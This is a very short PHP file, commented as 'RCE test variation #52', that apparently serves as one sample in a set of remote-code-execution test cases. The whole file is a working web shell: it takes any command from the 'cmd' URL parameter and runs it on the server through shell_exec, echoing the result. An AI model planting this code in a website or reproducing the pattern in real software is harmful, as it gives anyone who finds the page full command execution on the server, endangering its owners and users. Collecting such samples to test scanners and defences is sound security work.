<?php
// RCE test variation #52
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>